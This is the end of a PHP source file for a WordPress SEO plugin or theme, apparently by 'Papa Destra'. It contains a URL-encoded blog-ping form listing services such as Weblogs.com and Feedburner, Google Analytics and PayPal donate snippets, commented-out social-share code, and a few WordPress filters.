document.write(unescape("%09%3Cp%3E%0A%09%20%20%3Clabel%20for%3D%22title%22%20class%3D%22biglabel%22%3EBlog%20Name%20%3A%3C/label%3E%20%3Cinput%20name%3D%22title%22%20type%3D%22text%22%20class%3D%22text%22%20id%3D%22title%22%20size%3D%2250%22%20/%3E%0A%09%3C/p%3E%0A%0A%09%3Cp%3E%3Clabel%20for%3D%22blogurl%22%20class%3D%22biglabel%22%3EBlog%20Home%20Page%3C/label%3E%20%3Cinput%20name%3D%22blogurl%22%20type%3D%22text%22%20class%3D%22text%22%20id%3D%22blogurl%22%20size%3D%2250%22%20/%3E%0A%09%3C/p%3E%0A%09%3Cp%3E%3Clabel%20for%3D%22rssurl%22%20class%3D%22biglabel%22%3ERSS%20URL%20%28optional%29%3A%3C/label%3E%20%3Cinput%20name%3D%22rssurl%22%20type%3D%22text%22%20class%3D%22text%22%20id%3D%22rssurl%22%20size%3D%2250%22%20/%3E%0A%09%3C/p%3E%0A%09%3C/fieldset%3E%0A%09%3Ctable%20width%3D%22100%25%22%20border%3D%221%22%20align%3D%22center%22%20cellspacing%3D%221%22%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%20width%3D%2247%25%22%3E%3Ch4%3ECommon%20Services%20%28%3Ca%20href%3D%22javascript%3Acheck_common%28%29%3B%22%20id%3D%22checkall%22%3ECheck%20All%3C/a%3E%29%3C/h4%3E%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%20width%3D%2253%25%22%3E%3Ch4%3ESpecialized%20Services%3C/h4%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_weblogscom%27%3E%3Cinput%20id%3D%27chk_weblogscom%27%20name%3D%27chk_weblogscom%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Weblogs.com%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.weblogs.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Weblogs.com%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_audioweblogs%27%3E%3Cinput%20id%3D%27chk_audioweblogs%27%20name%3D%27chk_audioweblogs%27%20class%3D%27audio%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Audio.Weblogs%3C/label%3E%20%3Ca%20href%3D%27http%3A//audio.weblogs.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_audioweblogs%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_blogs%27%3E%3Cinput%20id%3D%27chk_blogs%27%20name%3D%27chk_blogs%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Blo.gs%3C/label%3E%20%3Ca%20href%3D%27http%3A//blo.gs/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Blo.gs%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_rubhub%27%3E%3Cinput%20id%3D%27chk_rubhub%27%20name%3D%27chk_rubhub%27%20class%3D%27social%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20RubHub%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.rubhub.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_rubhub%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_feedburner%27%3E%3Cinput%20id%3D%27chk_feedburner%27%20name%3D%27chk_feedburner%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Feed%20Burner%3C/label%3E%20%3Ca%20href%3D%27http%3A//feedburner.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Feed%20Burner%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_geourl%27%3E%3Cinput%20id%3D%27chk_geourl%27%20name%3D%27chk_geourl%27%20class%3D%27geo%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20GeoURL%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.geourl.org/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_geourl%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_syndic8%27%3E%3Cinput%20id%3D%27chk_syndic8%27%20name%3D%27chk_syndic8%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Syndic8%3C/label%3E%20%3Ca%20href%3D%27http%3A//syndic8.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Syndic8%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_a2b%27%3E%3Cinput%20id%3D%27chk_a2b%27%20name%3D%27chk_a2b%27%20class%3D%27geo%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20A2B%20GeoLocation%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.a2b.cc/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_a2b%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_newsgator%27%3E%3Cinput%20id%3D%27chk_newsgator%27%20name%3D%27chk_newsgator%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20NewsGator%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.newsgator.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20NewsGator%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_blogshares%27%3E%3Cinput%20id%3D%27chk_blogshares%27%20name%3D%27chk_blogshares%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20BlogShares%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.blogshares.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_blogshares%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_myyahoo%27%3E%3Cinput%20id%3D%27chk_myyahoo%27%20name%3D%27chk_myyahoo%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20My%20Yahoo%21%3C/label%3E%20%3Ca%20href%3D%27http%3A//my.yahoo.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20My%20Yahoo%21%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_pubsubcom%27%3E%3Cinput%20id%3D%27chk_pubsubcom%27%20name%3D%27chk_pubsubcom%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20PubSub.com%3C/label%3E%20%3Ca%20href%3D%27http%3A//pubsub.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20PubSub.com%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_blogdigger%27%3E%3Cinput%20id%3D%27chk_blogdigger%27%20name%3D%27chk_blogdigger%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Blogdigger%3C/label%3E%20%3Ca%20href%3D%27http%3A//blogdigger.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Blogdigger%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_blogstreet%27%3E%3Cinput%20id%3D%27chk_blogstreet%27%20name%3D%27chk_blogstreet%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20BlogStreet%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.blogstreet.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20BlogStreet%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_moreover%27%3E%3Cinput%20id%3D%27chk_moreover%27%20name%3D%27chk_moreover%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Moreover%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.moreover.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Moreover%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_weblogalot%27%3E%3Cinput%20id%3D%27chk_weblogalot%27%20name%3D%27chk_weblogalot%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Weblogalot%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.weblogalot.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Weblogalot%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_icerocket%27%3E%3Cinput%20id%3D%27chk_icerocket%27%20name%3D%27chk_icerocket%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Icerocket%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.icerocket.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Icerocket%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_newsisfree%27%3E%3Cinput%20id%3D%27chk_newsisfree%27%20name%3D%27chk_newsisfree%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20News%20Is%20Free%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.newsisfree.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20News%20Is%20Free%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_topicexchange%27%3E%3Cinput%20id%3D%27chk_topicexchange%27%20name%3D%27chk_topicexchange%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Topic%20Exchange%3C/label%3E%20%3Ca%20href%3D%27http%3A//topicexchange.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Topic%20Exchange%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_google%27%3E%3Cinput%20id%3D%27chk_google%27%20name%3D%27chk_google%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Google%20Blog%20Search%3C/label%3E%20%3Ca%20href%3D%27http%3A//blogsearch.google.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Google%20Blog%20Search%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_tailrank%27%3E%3Cinput%20id%3D%27chk_tailrank%27%20name%3D%27chk_tailrank%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Spinn3r%3C/label%3E%20%3Ca%20href%3D%27http%3A//spinn3r.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Spinn3r%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_postrank%27%3E%3Cinput%20id%3D%27chk_postrank%27%20name%3D%27chk_postrank%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20PostRank%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.postrank.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20PostRank%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_skygrid%27%3E%3Cinput%20id%3D%27chk_skygrid%27%20name%3D%27chk_skygrid%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20SkyGrid%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.skygrid.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20SkyGrid%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_collecta%27%3E%3Cinput%20id%3D%27chk_collecta%27%20name%3D%27chk_collecta%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Collecta%3C/label%3E%20%3Ca%20href%3D%27http%3A//collecta.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Collecta%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%3C/table%3E%0A%09%0A%09%3Cfieldset%20id%3D%22servicestoping%22%3E"));
//-->
</script>
</fieldset>
<script>
<!--
document.write(unescape("%3Cp%20class%3D%22submit%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Send%20Ping%22/%3E%3C/p%3E%0A%3Cspan%20class%3D%22automattic-joint%22%20style%3D%27text-decoration%3A%20none%27%3E%0AA%20%3Ca%20href%3D%27http%3A//wordpressfoundation.org%27%20target%3D%22_blank%22%3EWordPress%20Foundation%3C/a%3E%20Branch%26copy%3B%202010%20WordPress%20Foundation%3Cbr%3E%20%0AKami%20bekerja%20dengan%20Anda%20sebagai%20mitra%20teknologi%20sehingga%20Anda%20dapat%20fokus%20pada%20strategi%20inti%20bisnis%20Anda%20sementara%20kami%20bekerja%20di%20bagian%20belakang%20untuk%20membuat%20organisasi%20Anda%20mencapai%20pelanggan%20global%20di%20dunia%20web.%26nbsp%3B%26copy%3B%202010%20Papa%20Destra%0A%3C/span%3E%0A"));
//-->
</script></form>
</div></div></div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-52447-20");
pageTracker._trackPageview();
} catch(err) {}</script>
</p>
<p>&nbsp;</p>
If you find this useful, I appreciate a little time to get better by giving donations using Paypal button below. Thank you 
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="H9PUAV7KT2HFY">
<input type="image" src="https://www.paypal.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypal.com/id_ID/i/scr/pixel.gif" width="1" height="1">
</form>
<?php
}

/*  Report BUG This Version = Papa Destra 
====================================================================================================
function gayasoyboy(){
        $bagi_keteman = WP_PLUGIN_URL . '/bye_maridjan/gaya.css';
        $tempat_pile = WP_PLUGIN_DIR . '/bye_maridjan/gaya.css';
        if ( file_exists($tempat_pile) ) {
            wp_register_style('bagi_jajan_pasar', $bagi_keteman);
            wp_enqueue_style( 'bagi_jajan_pasar');
        }
    }
add_action( 'wp_print_styles', 'gayasoyboy' );
function pencetan_tampil($ayo_bagi_aja_makde) {
	if(is_single()) {
		$ayo_bagi_aja_makde .= '<div class="simple_socialmedia"><ul>';
		$ayo_bagi_aja_makde .= '<li class="twitter"><a href="http://twitter.com/share?url='.get_permalink().'&amp;text='.get_the_title().'" target="_blank">Tweet</a></li>';
		$ayo_bagi_aja_makde .= '<li class="facebook"><a target="_blank" title="Share on Facebook" rel="nofollow" href="http://www.facebook.com/sharer.php?u='.get_permalink().'&amp;t='.get_the_title().'">Facebook</a></li>';
		$ayo_bagi_aja_makde .= '<li class="stumble"><a target="_blank" title="Share on StumbleUpon" rel="nofollow" href="http://www.stumbleupon.com/submit?url='.get_permalink().'">StumbleUpon</a></li>';
		$ayo_bagi_aja_makde .= '<li class="digg"><a target="_blank" title="Share on Digg" rel="nofollow" href="http://www.digg.com/submit?phase=2&amp;url='.get_permalink().'">Digg</a></li>';
		$ayo_bagi_aja_makde .= '<li class="delicious"><a target="_blank" title="Share on Delicious" rel="nofollow" href="http://del.icio.us/post?url='.get_permalink().'&amp;title=INSERT_TITLE">Delicious</a></li>';
		$ayo_bagi_aja_makde .= '</ul></div>';						
	}
	return $ayo_bagi_aja_makde;
}
 add_filter('the_content', 'pencetan_tampil');
 */
add_filter('the_excerpt_rss', 'rss_post_thumbnail');
add_filter('the_content_feed', 'rss_post_thumbnail');
add_filter('login_errors',create_function('$a', "return null;"));
add_theme_support('post-thumbnails');
//
add_action('wp_head', 'hehed');
function hehed (){
echo "<!-- Maridjan SEO - Papa Destra - http://papadestra.com/-->\n";
}
?>
